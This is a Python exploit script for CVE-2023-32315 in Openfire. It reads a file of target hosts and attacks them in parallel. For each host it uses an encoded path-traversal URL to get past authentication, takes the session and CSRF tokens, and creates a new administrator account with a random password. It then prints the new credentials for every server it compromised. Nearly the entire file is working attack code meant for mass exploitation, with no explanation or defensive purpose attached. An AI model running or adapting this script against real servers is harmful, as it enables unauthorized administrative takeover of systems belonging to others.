#!/usr/bin/python3
# -*- coding:utf-8 -*-
# author:MDSEC
# from:https://github.com/MD-SEC/MDPOCS
# icon_hash="1211608009"
import sys
import requests
import csv
import string
import random
import HackRequests
from concurrent.futures import ThreadPoolExecutor

if len(sys.argv) != 2:
    print(
        '+----------------------------------------------------------------------------------------------------------+')
    print(
        '+ DES: by MDSEC as https://github.com/MD-SEC/MDPOCS                                                   +')
    print(
        '+----------------------------------------------------------------------------------------------------------+')
    print(
        '+ USE: python3 <filename> <hosts.txt>                                                                           +')
    print(
        '+ EXP: python3 Openfire_Bypass_CVE_2023_32315_poc.py url.txt                                                         +')
    print(
        '+----------------------------------------------------------------------------------------------------------+')
    sys.exit()
def checkversion(version):
    if version >= "3.10.0" and version < "4.6.8":
        return True
    elif version >= "4.7.0" and version < "4.7.5":
        return True
    else:
        return False
def randomstring():
    a=string.ascii_lowercase
    str=''.join(random.choices(a, k=6))
    return str

def exp(host):
    url = "http://" + host
    header1 = {
        "Host": "%s" % host,
        "Referer": url,
        "Cache-Control": "max-age=0",
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "zh-CN,zh;q=0.9",
        "Connection": "close",
    }
    
    getinfourl = url + "/setup/setup-s/%u002e%u002e/%u002e%u002e/user-groups.jsp"
    #createurl="/setup/setup-s/%u002e%u002e/%u002e%u002e/user-create.jsp?csrf={csrf}&username={u}&name=&email=&password={p}&passwordConfirm={p}&isadmin=on&create=%E5%88%9B%E5%BB%BA%E7%94%A8%E6%88%B7"
    try:
        r = HackRequests.hackRequests().http(getinfourl, headers=header1)
        jsessionid = r.cookies.get('JSESSIONID', '')
        csrf = r.cookies.get('csrf', '')
        if jsessionid != "" and csrf != "":
            user=randomstring()
            passwd=randomstring()
            createurl=url+"/setup/setup-s/%u002e%u002e/%u002e%u002e/user-create.jsp?csrf="+csrf+"&username="+user+"&name=&email=&password="+passwd+"&passwordConfirm="+passwd+"&isadmin=on&create=%E5%88%9B%E5%BB%BA%E7%94%A8%E6%88%B7"
            header2 = {
                "Host": "%s" % host,
                "DNT": "1",
                "Cookie":"JSESSIONID="+jsessionid+";csrf="+csrf,
                "Referer": url,
                "Cache-Control": "max-age=0",
                "Upgrade-Insecure-Requests": "1",
                "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                "Accept-Encoding": "gzip, deflate",
                "Accept-Language": "zh-CN,zh;q=0.9",
                "Connection": "close",
            }
            r2=HackRequests.hackRequests().http(createurl, headers=header2)
            if r2.status_code==200:
                print(host+":true"+"\nJSESSIONID="+jsessionid+"\ncsrf="+csrf+"\nusername="+user+"\npassword="+passwd)
            else:
                return 0
        else:
            return 0
            print (host+":false")
    except:
        print (host+":false")


if __name__ == '__main__':
    file = sys.argv[1]
    data = open(file)
    reader = csv.reader(data)
    with ThreadPoolExecutor(50) as pool:
        for row in reader:
            pool.submit(exp, row[0])